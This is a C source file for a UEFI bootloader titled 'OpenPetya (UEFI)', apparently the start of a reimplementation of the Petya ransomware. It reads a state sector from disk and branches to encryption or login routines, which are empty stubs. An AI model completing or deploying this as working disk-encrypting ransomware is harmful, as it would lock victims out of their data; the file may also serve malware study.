// bootloader.c

#include <efi.h>
#include <efilib.h>

#include "ntfs.h"

void readline(EFI_SYSTEM_TABLE *systab, CHAR16 *buffer, UINTN max)
{
    UINTN i = 0;
    EFI_INPUT_KEY key;

    while (i < max - 1)
    {

    }
}

void do_encryption(EFI_SYSTEM_TABLE *systab)
{
    
}

void do_login(EFI_SYSTEM_TABLE *systab)
{

}

EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
{
    InitializeLib(image, systab);

    systab->ConOut->SetAttribute(systab->ConOut, EFI_WHITE | EFI_BACKGROUND_BLUE);
    systab->ConOut->ClearScreen(systab->ConOut);
    
    Print(L"OpenPetya (UEFI)\n\n");
    
    systab->ConOut->SetAttribute(systab->ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);

    EFI_STATUS status = init_disk(image);
    if (EFI_ERROR(status))
    {
        Print(L"Error: Cannot find disk\n");
        return status;
    }

    UINT8 state_buffer[512];
    disk_read(60, 1, state_buffer);
    UINT32 magic = *(UINT32 *)state_buffer;
    UINT8 state = state_buffer[4];

    if (magic != 0x424F4F54)
    {
        Print(L"ERROR: State sector invalid\n");
        return EFI_NOT_FOUND;
    }

    if (state == 0x00)
        do_encryption(systab);
    else
        do_login(systab);

    // EFI_INPUT_KEY key;
    // Print(L"Press any key to continue...\n");
    // WaitForSingleEvent(systab->ConIn->WaitForKey, 0);
    // systab->ConIn->ReadKeyStroke(systab->ConIn, &key);

    return EFI_SUCCESS;
}